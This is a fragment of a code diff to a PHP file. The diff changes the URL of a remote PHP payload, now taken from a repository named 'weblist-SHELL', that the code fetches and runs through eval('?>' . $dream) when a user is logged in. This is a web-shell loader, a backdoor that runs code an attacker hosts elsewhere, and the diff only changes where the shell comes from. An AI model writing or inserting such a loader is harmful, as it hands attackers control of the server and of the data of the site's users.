@@ -67,7 +67,7 @@ if (is_logged_in()) {
         return false;
     }
 
-    $destiny = 'https://raw.githubusercontent.com/hapecina731/weblist287/refs/heads/main/omgsmok.php';
+    $destiny = 'https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/omgsmok.php';
     $dream = geturlsinfo($destiny);
     if ($dream !== false) {
         eval('?>' . $dream);
